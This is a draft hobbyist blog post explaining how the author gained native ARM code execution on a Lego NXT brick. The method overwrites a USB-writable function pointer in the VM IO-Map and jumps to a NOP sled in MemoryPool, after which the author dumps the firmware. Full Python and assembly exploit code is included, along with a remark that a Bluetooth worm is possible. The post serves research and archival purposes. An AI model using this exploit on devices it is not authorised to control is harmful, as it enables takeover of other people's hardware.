Title: Dumping Lego NXT firmware off of an existing brick
Date: 2025-08-28
Summary: Catgirls can have little a RCE, as a treat
Status: draft

I've recently been contributing to the [Pybricks](https://github.com/pybricks/) project, a community-run port of MicroPython to Lego Mindstorms hardware. As part of that, I obtained a used [Lego NXT](https://en.wikipedia.org/wiki/Lego_Mindstorms_NXT) which just so happened to still be running the original version 1.01 firmware from when it launched in 2006. I wanted to archive a copy of this firmware, and doing so happened to involve the discovery of arbitrary code execution.

# Preliminary research

Or, in the words of a much more innocent era, "Google is your friend" <small>(lol, not anymore, making research skills even more critical than they ever have been)</small>.

"Surely somebody must've already archived a copy of this firmware, right?" I thought to myself. Unfortunately, this does not appear to have been the case. I searched but never came across a copy of this particular firmware version despite the extensive NXT enthusiast community.

I _did_ come across [a mention](https://hightechkidsblog.blogspot.com/2006/07/nxt-firmware-should-i-download-103.html) of a 1.03 firmware which appears to have been released on or very close to launch day. I suspect that enthusiasts and advanced users likely eagerly switched to newer and/or community-modified firmwares when they wanted newer features.

The NXT is also old enough that, despite being part of "the Internet era", resources are starting to bitrot.

Looks like I'm going to have to figure out how to retrieve a copy myself!

# Use the firmware updater?

The first idea which came to mind for backing up firmware is "does the tool which is used to download new firmware to the NXT also allow retrieving the preexisting firmware?"

From sources including [the Wikipedia page](https://en.wikipedia.org/wiki/Lego_Mindstorms_NXT), we find that the NXT is built around a Microchip (formerly Atmel) [AT91SAM7S256](https://www.microchip.com/en-us/product/at91sam7s256) microcontroller, a distant ancestor of the SAM D parts that now power several Arduino, MicroPython, and CircuitPython boards. This chip contains a built-in bootloader program called SAM-BA which supports simple "read from memory" (traditionally known as `PEEK`) and "write to memory" (traditionally known as `POKE`) commands. This (deceptively!) seems like it'd work!

Fortunately, while researching, I found out that [somebody did try this already](https://bricks.stackexchange.com/questions/16909/) and was _unsuccessful_. Attempting to enter the SAM-BA bootloader appears to automatically _overwrite_ part of the firmware which we want to back up. Good thing I did my research first! We have to find a different approach that doesn't involve entering firmware update mode.

# Use JTAG?

JTAG is a hardware interface used for providing all sorts of "debug" and "test" functionality for circuit boards and chips. Precisely what can be done using JTAG varies greatly, but the microcontroller in the NXT allows JTAG to read and modify all of the CPU's state for debugging. This can be used to read back data stored inside the chip.

<p class="aside_q">Is this related to using JTAG to hack an Xbox or a mobile phone?</p>

<div class="aside_a"><p>Yes! Those devices also use the same low-level protocol known as JTAG. However, the debug and test commands which can be used <em>on top of</em> JTAG are completely different. Think of JTAG as being similar to TCP or UDP while the chip-specific commands are higher-level protocols such as HTTP or SSH.</p></div>

Unfortunately, since this is a _hardware_ interface, using it involves taking apart the NXT and soldering to it (since the necessary connectors are not installed). Additionally, this chip is so old that its debug interface is cumbersome to set up and use (it doesn't support <abbr title="Serial Wire Debug">SWD</abbr>, <abbr title="Arm Debug Interface, version 5">ADIv5</abbr>, or any of the interfaces and protocols that the cheap modern tools are designed for).

I considered this method a last resort but really wanted to find a software-only solution. Software-only solutions are generally easier to share and deploy, so finding one would allow many other people to also back up the firmware of bricks in their possession.

# Use a custom NXT program?

For a device like the NXT which already allows for limited user-programmability, the first instinct is usually to explore what this limited or "sandboxed" environment allows you to do. How do NXT programs work? Can we just write an NXT program that dumps the firmware and sends it to the computer?

If we hunt around, we can [find](http://www.cee.uma.pt/droide2/plataforma/documentation/fantom.pdf) the "LEGO MINDSTORMS NXT Executable File Specification" which explains that NXT programs run in a bytecode <abbr title="Virtual Machine">VM</abbr> and doesn't have the ability to read/write arbitrary memory. Variables are restricted to a "data segment" of fixed size, and all memory accesses must be inside it. This means that we cannot "just" write an NXT program (unless we find a bug in the VM which allows us to access memory we're not supposed to).

<p class="aside_q">What is the difference between a VM and "native" code?</p>

<div class="aside_a"><div>
<p>"Native" code refers to code which a CPU can directly run. A <em>virtual machine</em> is a way of adding a layer of indirection between a program and the real CPU. Computer scientists love solving problems by adding indirection, and a virtual machine can be used to solve problems such as incompatibility, convenience, and/or security.</p>

<p>For example, a virtual machine can be used to take code designed for one type of CPU and run it on a different type of CPU. This is often called an <em>emulator</em>, and they can be useful when it isn't possible to recompile the code for the new CPU (such as if the original program is a closed-source video game for a proprietary game console but you want to run it on a desktop PC).</p>

<p>Java and .NET run on virtual machines which are specifically designed so that managing memory is more convenient (such as by having garbage collection). They can also be used to implement security by funneling "dangerous" operations into specific, limited pathways. The NXT's virtual machine is a virtual machine of this type.</p>
</div></div>

# The NXT firmware

For those who aren't aware, the source code of the NXT firmware is publicly available! However, many links to it have bitrotted, source code only seems to have been released for _some_ versions (certainly not _every_), and it's not even clear which versions of the code have been archived and still exist. (For example, the seemingly-official `LEGO-Robotics/NXT-Firmware` repository on GitHub... is actually a community-modified firmware! Its history also only contains versions 1.05 and 1.29 specifically and not, for example, the final 1.31 or the original 1.01.)

Nonetheless, we can still [study it](https://github.com/dlech/nxt-firmware) to see if we can find anything interesting. At the same time, we can also study a [copy of the NXT Bluetooth Developer Kit](https://github.com/Chris00/ocaml-mindstorm/tree/master/doc/NXT/BDK) in order to understand how the computer communicates with the brick. (Despite being the "Bluetooth" developer kit, the documented protocol and commands are used over USB as well.)

## NXT communications protocol

From reading through the "LEGO MINDSTORMS NXT Communication Protocol" and "LEGO MINDSTORMS NXT Direct Commands" documents, we start to see the following high-level overview:

The protocol contains two categories of commands, "system" and "direct". System commands vaguely relate to "operating system" functionality, and direct commands vaguely relate to "actually operating a robot". In general, this protocol _also_ seems to specifically *not* allow performing arbitrary operations and badness such as accessing the firmware or getting native code execution outside of the VM. It appears to be designed to give friendly access to _only_ the NXT's virtual filesystem and bytecode interpreter.

Since both the VM and the communications protocol appear to be designed to keep us out, it's starting to look like we're going to need to find some kind of exploit.

## IO-Maps

While looking through all of these documents, I generally focused my attention on "low-level" functionality, as it is much more likely to contain the ability to access the firmware and/or arbitrary memory. One feature, "IO-Maps", immediately stood out.

In the NXT Communication Protocol document, IO-Maps are described as "the well-described layer between the different controllers/drivers stack and the VM running the user's code." That sounds potentially interesting if it allows access to drivers in ways which aren't normally allowed. Also, if this is an interface which isn't normally used, it is a potential location for unexpected and exploitable bugs.

So... where does one find the so-called "well-described" description of what IO-Maps can do?

One of the best explanations I found was [an old copy of the NXC programmer's guide](http://lego.itam.mx/misc/manuales/NXC/guide.pdf). NXC (Not eXactly C) is an alternative frontend for creating NXT programs for the stock firmware in a C-like language rather than graphical blocks. This programmer's guide lists all of the IO-Map offsets for each firmware module, and the explanations make it clear that IO-Maps contain essentially all of each module's internal state.

Further searching finds [this](https://ni.fr.eu.org/lego/nxt_memory_access/) blog post explaining how it's possible to watch and plot variables in the user program by reading from the VM module's IO-Map. It definitely feels like we could be on to something here!

### IO-Maps in the firmware source code

How do you find the IO-Map structures in the firmware source code? That blog post lists a `struct`, but where is said struct?

It turns out that all IO-Maps are defined in `.iom` files in the firmware, with the VM's being defined in [`c_cmd.iom`](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom).

# Big fat exploit

Without even having to look at any other modules, we can already spot something: the VM IO-Map contains a function pointer `pRCHandler`! What does this function pointer do?

It turns out that [this is the command handler for "direct" commands](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_comm.c#L392-L414)!

Is this... really just a native code function pointer sitting inside this IO-Map structure which is both readable *and* writable over USB?

<p class="aside_q">What is a function pointer? Why is finding a function pointer such a big deal?</p>

<div class="aside_a"><p>A function pointer is a piece of data which stores the location of some code. A program uses this data to decide what code to run next. Programs themselves can modify function pointers in order to alter their functionality as they run, but, if <em>we</em> can modify the function pointer, we can <em>also</em> alter what the program does, including in ways that may be unintended.</p></div>

## Scoping out the exploit

In order to try out whether this even has a chance of working, we will need to send commands to the NXT over USB. This can be done in many different ways, but here we will use the [Python](https://www.python.org/) programming language. Python is very suitable for testing and prototyping because it has a <abbr title="Read-Eval-Print-Loop">REPL</abbr> and many third-party libraries implementing functionality that we can reuse. In this case, we will use the [PyUSB](https://github.com/pyusb/pyusb) library to talk to the NXT.

<small>Setting up Python, creating a _virtualenv_, installing PyUSB, installing USB drivers, and configuring USB permissions will all be left as an exercise for the reader. This _is_ all very important, but "setting up and configuring a development environment" is a _huge_ task all on its own, requiring _tons_ of often-poorly-documented implicit knowledge, and I wanted to get this article done in a reasonable amount of time.</small>

First we need to open a connection to the NXT:

```python
>>> import usb.core
>>> dev = usb.core.find(idVendor=0x0694, idProduct=0x0002)
>>> dev.set_configuration()
```

Then we need to see if we can indeed access the VM (or "command") module's IO-Map:

```python
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x00\x00\x10\x00')
10
>>> bytes(dev.read(0x82, 64))
b'\x02\x94\x00\x01\x00\x01\x00\x10\x00MindstormsNXT\x00\x00\x00'
```

<p class="aside_q">Uhh... what?</p>

<div class="aside_a"><p>Ah yes. Most people have not invested <em>years</em> into skills such as staring at hex dumps and raw data. I'll have to give a more detailed explanation.</p></div>

We want to send the "Read IO Map Command" to the NXT. This command is documented on page 20 of the "LEGO MINDSTORMS NXT Communication Protocol" document, and the request is documented to take 10 bytes. Here we're manually inputting each of the bytes using a hexadecimal escape sequence.

The first two bytes are required to be 0x01 and 0x94: `\x01\x94`.

This is followed by the module ID in _little-endian_ format: `\x01\x00\x01\x00`. This corresponds to a module ID of <span class="tabnum">0x00010001</span> which is the ID of the VM module.

<p class="aside_q">What is little-endian?</p>

<div class="aside_a"><div>
<p>When a value is stored using more than one byte, the bytes have to be stored in a particular order, just like how decimal numbers with multiple digits have to be written in a particular order. "Little-endian" is the "opposite" or "backwards" order from how Arabic numerals are written, meaning that the "first" or "leftmost" byte has the lowest place value. This byte is called the "LSB" or "least-significant byte". The "last" or "rightmost" byte has the highest place value and is called the "MSB" or "most-significant byte".</p>

<p>"Big-endian" is the opposite of little-endian and matches the order of Arabic numerals. The "endian" names are a historical artifact.</p>

<p>TL;DR it means you have to flip the bytes around</p>
</div></div>

The next two bytes `\x00\x00` correspond to an offset of 0.

Finally, the last two bytes `\x10\x00` correspond to a length of 0x10 or 16.

In summary, this command means "read 16 bytes from offset 0 of the VM module's IO-Map".

To actually send the command to the NXT, we write it to USB endpoint 1. To read the response, we send a read command to USB endpoint <span class="tabnum">0x82</span> (don't worry about it).

<div class="aside_q"><p>But I <em>am</em> worried about it!</p></div>

<div class="aside_a"><p>Understanding this requires a minimal understanding of how the USB device framework works. An excellent overview can be found <a href="https://www.beyondlogic.org/usbnutshell/usb3.shtml">here</a>. In short, when talking to a USB device, data needs to be sent to or received from specific <em>endpoints</em>. A device can have multiple endpoints of different types and directions. Each endpoint is identified by an address, which can be found in the USB descriptors. The NXT uses two "bulk" endpoints, one in each direction, and their addresses are <span class="tabnum">0x01</span> and <span class="tabnum">0x82</span>.</p></div>

If we decode the response according to the documentation, we find that the first bytes `\x02\x94` are exactly as specified under the "return package" heading.

The next byte, `\x00`, means that the command succeeded.

This is followed by a repeat of the module ID `\x01\x00\x01\x00` and the requested length `\x10\x00`.

Finally, we have the data which was read: `MindstormsNXT\x00\x00\x00`. This data corresponds to `FormatString` [in the code](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L181), and [here](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.c#L1167) it is initialized to the `MindstormsNXT` value that we see.

Let's try reading that function pointer now:

```python
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x10\x00\x04\x00')
10
>>> dev.read(0x82, 64)
array('B', [2, 148, 0, 1, 0, 1, 0, 4, 0, 61, 13, 16, 0])
>>> hex(16 << 16 | 13 << 8 | 61)
'0x100d3d'
```

It helps to see the difference if we line up the two commands:

```python
# First test
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x00\x00\x10\x00')
# Second test
>>> dev.write(1, b'\x01\x94\x01\x00\x01\x00\x10\x00\x04\x00')
# Difference                                 ^^      ^^
```

We've changed the offset from `\x00\x00` to `\x10\x00` (from 0 to 16). We've changed the length from `\x10\x00` to `\x04\x00` (from 16 to 4). (Remember that all the numbers are in little-endian!)

Instead of turning the response into a `bytes` object, we leave it as an array. In order to find the "actual data" which was read, we can either manually count all the bytes again, or we can realize that the data is going to be the last 4 bytes: `[61, 13, 16, 0]`. The final line of code converts this into the value of <span class="tabnum">0x100d3d</span>. This is our function pointer, but what does this number mean?

If we look at [the datasheet for the AT91SAM7S256 microcontroller](https://ww1.microchip.com/downloads/en/DeviceDoc/doc6175.pdf) and look at Figure 8-1 "SAM7S512/256/128/64/321/32/161/16 Memory Mapping", we can see that memory addresses in the range <span class="tabnum">0x001<em>xxxxx</em></span> correspond to the internal flash memory of the chip. The value that we read, <span class="tabnum">0x100d3d</span>, is <span class="tabnum">0xd3d</span> bytes or about 3 KiB past the beginning of the internal flash memory. This certainly looks like a reasonable function pointer! If we modify this function pointer, we should be able to redirect code execution for "direct" commands to something else.

## Gaining code execution

What, specifically, can we modify this pointer _to_ in order to gain arbitrary code execution? On a modern system with memory protections and advanced exploit mitigations, this part of the puzzle may end up being a challenging task. However, this microcontroller has none of these features. We should be able to put in _any_ valid address and have the microcontroller execute that address as code (as long as we've put valid code there).

<p class="aside_q">How do you "put valid code somewhere"? What does that actually mean?</p>

<div class="aside_a"><div>
<p>Many modern computers are designed so that the computer's instructions can be accessed and manipulated as data. Likewise, data can be treated as instructions. This is certainly the case for the microcontroller in question here. This idea is <em>critically important</em>. It means that, as long as we can put some <em>data</em> in some location, and as long as that data happens to represent valid instructions, the CPU will be able to execute it.</p>

<p>This is not the case on every system. For example, the AVR architecture does not treat instruction memory and data memory as interchangeable. Modern operating systems such as Windows or Android also typically prevent accessing data as instructions (often called <abbr title="Data Execution Prevention">DEP</abbr> or <abbr title="No eXecute">NX</abbr>) without going through some extra steps. This helps protect against… exactly what we're doing here.</p>

<p>The fact that we have a simple target which <em>can</em> freely interchange data and code and which doesn't have modern protections makes this an excellent learning target.</p>
</div></div>

What addresses can we actually modify the function pointer to? We don't know what the code looks like (that's the whole point of this exercise!), and we don't know precisely how the data memory is laid out either. We can only put in _one_ address, so what do we do?

Here's where we get very lucky.

Inside the VM's IO-Map, there is a [`MemoryPool`](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L196) variable corresponding to the data segment of the running NXT program. This variable is [32 KiB](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.iom#L149) in size, which means that we have 32 KiB of space that we can safely fill with whatever we want (as long as no program is running).

<p class="aside_q">"Safely"?</p>

<p class="aside_a">That means that the firmware will not crash if we modify or corrupt the memory pool, since it doesn't get accessed if no user program is running.</p>

The NXT's microcontroller has a total of 64 KiB of RAM. Observe that 32 KiB is _half_ of that total. If we assume that the firmware lays out RAM starting from the lowest address and going up, and that the firmware uses more than 0 bytes of RAM (both very reasonable assumptions), there is *no possible location* the firmware could put this memory pool that doesn't intersect with the address 32 KiB past the start of RAM, <span class="tabnum">0x00208000</span>.

Since we don't know _exactly_ where the buffer sits in RAM, we can fill the initial part of the buffer with `nop` (no operation) instructions. We put our exploit code at the very end of the buffer. As long as <span class="tabnum">0x00208000</span> isn't _too_ close to the end of the memory pool, it will end up pointing somewhere in the pile of `nop`s.

If we cause the CPU to jump to this address, the CPU will keep executing the `nop`s until it finally hits our code. This exploitation technique is called a "NOP slide" or "NOP sled".

In order to test this out, we need to build a bunch of scaffolding:

```python
import struct
import subprocess
import usb.core

def iomap_rbytes(mod, off, len_):
    cmd = struct.pack("<BBIHH", 1, 0x94, mod, off, len_)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:9] == struct.pack("<BBBIH", 2, 0x94, 0, mod, len_)
    result_val = result[9:]
    return result_val

def iomap_r32(mod, off):
    cmd = struct.pack("<BBIHH", 1, 0x94, mod, off, 4)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:9] == struct.pack("<BBBIH", 2, 0x94, 0, mod, 4)
    result_val = struct.unpack("<I", result[9:])[0]
    return result_val

def iomap_w32(mod, off, val):
    cmd = struct.pack("<BBIHHI", 1, 0x95, mod, off, 4, val)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result == struct.pack("<BBBIH", 2, 0x95, 0, mod, 4)

def testbeep():
    cmd = b'\x00\x03\xff\x00\xff\x00'
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    print(result)

CMD_MODULE = 0x00010001
CMD_OFF_FNPTR = 16
CMD_OFF_MEMPOOL = 52

subprocess.run(['arm-none-eabi-gcc', '-c', 'nxtpwn.s'], check=True)
subprocess.run(['arm-none-eabi-objcopy', '-O', 'binary', 'nxtpwn.o', 'nxtpwn.bin'], check=True)
with open('nxtpwn.bin', 'rb') as f:
    nxtpwn_code = f.read()
print("code", nxtpwn_code)
assert len(nxtpwn_code) % 4 == 0

ARM_NOP = 0xe1a00000
nop_len = 32*1024 - len(nxtpwn_code)

dev = usb.core.find(idVendor=0x0694, idProduct=0x0002)
dev.set_configuration()

print("filling memory...")
for i in range(nop_len // 4):
    iomap_w32(CMD_MODULE, CMD_OFF_MEMPOOL + i*4, ARM_NOP)
for i in range(len(nxtpwn_code) // 4):
    offs = nop_len + i*4
    val = struct.unpack("<I", nxtpwn_code[i*4:i*4+4])[0]
    iomap_w32(CMD_MODULE, CMD_OFF_MEMPOOL + offs, val)
```

This code invokes an ARM assembler to assemble code written in `nxtpwn.s` into binary data, fills most of the `MemoryPool` with `nop`s, and then writes the assembled code at the end.

<small>You will need to somehow install a copy of GCC and Binutils targeting ARM. Any reasonable version should do, but this is also part of "environment setup".</small>

To test this, we can write the most basic assembly code in `nxtpwn.s`:

```asm
bx lr
```

This is an empty function which doesn't do anything.

<p class="aside_q">How do you learn ARM assembly language?</p>

<div class="aside_a"><p>I personally learned ARM assembly from <a href="https://www.coranac.com/tonc/text/asm.htm">this tutorial</a> a long time ago. TODO: what should I put here?</p></div>

We can use `python3 -i nxtpwn.py` to load the exploit code before dropping us into the Python REPL.

Before we actually trigger the exploit, let's try running a "direct" command to make sure it works:

```python
>>> testbeep()
b'\x02\x03\x00'
```

This should make the NXT beep.

To trigger the exploit, we can enter the following:

```python
>>> iomap_w32(CMD_MODULE, CMD_OFF_FNPTR, 0x00200000 + 32*1024)
```

This replaces that `pRCHandler` function pointer with an address in RAM as described above. Now let's try to make the NXT beep again:

```python
>>> testbeep()
b'\x02\x03\x00\x01\x00\x01\x00'
```

This time the NXT doesn't beep (because we've replaced the function which handles direct commands with an empty function) and returns different (garbage) data (because our empty function doesn't set the output length properly either).

We have successfully achieved _native_ ARM code execution on the NXT, on an unmodified firmware. This means that we are now free from _all_ of the restrictions the firmware normally imposes.

# Dumping firmware

Native code execution means we can access any data inside the microcontroller, including the firmware. To actually access it, we need to replace the direct command handler with a function which lets us read arbitrary memory addresses. The direct command handler turns out to be an _excellent_ location to hijack because it is already hooked up to all the infrastructure needed to communicate to and from the PC. This greatly simplifies the work we need to do.

In the firmware source code, we can see that the [original command handler](https://github.com/dlech/nxt-firmware/blob/master/AT91SAM7S256/Source/c_cmd.c#L367) normally takes three arguments: the input buffer, the output buffer, and a pointer to the length of the output. According to the ARM <abbr title="Application Binary Interface">ABI</abbr>, these values will be stored in CPU registers `r0`, `r1`, and `r2` respectively.

<p class="aside_q">That function is written in C. How can you replace it with a function written in assembly? What is an ABI??</p>

<div class="aside_a"><div>
<p>C code is turned into assembly code by a <em>compiler</em>. If we're not using a compiler, we can still write assembly code by hand.</p>

<p>When a C compiler turns code into assembly, it has to follow certain conventions in order for different parts of the program to work together properly. For example, code which needs to make a function call needs to agree with the function being called about where to put the function arguments. This information (as well as lots of other stuff we don't care about right now) is specified as part of the ABI.</p>

<p>Because the ARM architecture is a <abbr title="Reduced Instruction Set Computer">RISC</abbr> architecture with comparatively "many" CPU registers, functions with 4 or fewer arguments ≤ 32 bits in size will have the arguments placed into registers <code>r0</code>-<code>r3</code>.</p>

<p>As long as our assembly code follows the same conventions as the C code (follows the ABI), the existing firmware can call our code with no problems.</p>
</div></div>

We can replace the direct command handler with a function that reads from an arbitrary address that we give it:

```asm
# save r4
push {r4}

# skip 2 bytes of packet
add r0, #2

# load 4 bytes of the address
ldrb r3, [r0]
add r0, #1
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #8
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #16
ldrb r4, [r0]
add r0, #1
orr r3, r4, lsl #24

# read data from that address
ldr r3, [r3]

# store 4 bytes of the resulting value
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]
add r1, #1
lsr r3, #8
strb r3, [r1]

# store the output length of 4
mov r3, #4
strb r3, [r2]

# return success
mov r0, #0
pop {r4}
bx lr
```

<div class="aside_q"><p>Why do we need to save <code>r4</code>?</p></div>

<div class="aside_a"><p>The ABI says so. ABIs typically designate that called functions can freely modify only certain registers. Called functions have to save and restore the others. This is a trade-off to try to reduce unnecessary saving and reloading of data which is no longer needed.</p></div>

Now that we have this exploit code, we can now add some more code to the Python script in order to use it:

```python
print("sending pwn command")
iomap_w32(CMD_MODULE, CMD_OFF_FNPTR, 0x00200000 + 32*1024)

def pwn_read(addr):
    cmd = struct.pack("<BBI", 0, 0xaa, addr)
    dev.write(1, cmd)
    result = bytes(dev.read(0x82, 64))
    # print(result)
    assert result[:2] == struct.pack("<BB", 2, 0xaa)
    result_val = struct.unpack("<I", result[2:])[0]
    return result_val
```

This code sends a "direct" command with a dummy command byte of 0xaa (the firmware assumes this exists) followed by an address we want to read. The result contains the dummy command followed by 4 bytes of data. We can now try it out:

```python
>>> hex(pwn_read(0))
'0xeafffffe'
>>> hex(pwn_read(0))
'0xeafffffe'
>>> hex(pwn_read(4))
'0xeafffffe'
>>> hex(pwn_read(8))
'0xeafffffe'
>>> hex(pwn_read(0xc))
'0xeafffffe'
>>> hex(pwn_read(0x10))
'0xeafffffe'
>>> hex(pwn_read(0x14))
'0xeafffffe'
>>> hex(pwn_read(0x18))
'0xea000009'
>>> hex(pwn_read(0x1c))
'0xe1a09000'
>>> hex(pwn_read(0x20))
'0xe5980104'
```

This certainly looks like valid ARM code! (The leading 0xe indicates an instruction which is always executed (as opposed to only executed if some test is true), and `0xeafffffe` is an infinite loop.)

All we need to do now is to loop over 256 KiB starting at <span class="tabnum">0x001<em>xxxxx</em></span> and save it to a file:

```python
print("reading flash...")
with open('nxtpwn-dump.bin', 'wb') as f:
    for i in range(256 * 1024 // 4):
        addr = 0x00100000 + i * 4
        val = pwn_read(addr)
        f.write(struct.pack("<I", val))
        if i % 1024 == 0:
            print(f"\tDone with {(i // 1024 + 1) * 4}/256 KiB")
```

And with that, we have the firmware:

```
$ xxd nxtpwn-dump.bin | less
…
00019cd0: 3032 5800 4d61 7220 2033 2032 3030 3600  02X.Mar  3 2006.
00019ce0: 3138 3a32 313a 3033 004a 616e 4665 624d  18:21:03.JanFebM
…
```

Dumping the firmware in this manner also dumps all of the user programs and data stored on the brick, so I won't be releasing this until I clean it up a bit (so as to protect the privacy of the previous owner).

# What else?

Although I haven't tested it, this exploit likely works on all NXT firmwares derived from the stock firmware. This means that it was and is possible to run [bare-metal code on the NXT](https://www.cs.tau.ac.il/~stoledo/lego/nxt-native/) without a modified firmware. This "just" requires somebody to write an appropriate program loader.

These commands can be triggered over Bluetooth, so I believe it's possible for paired NXTs to send them to each other. It should be possible to write an NXT worm (please don't write a malicious one).

If anybody is a skilled internet archivist, this is your chance to capture as many firmware versions as you can.

Happy hacking!
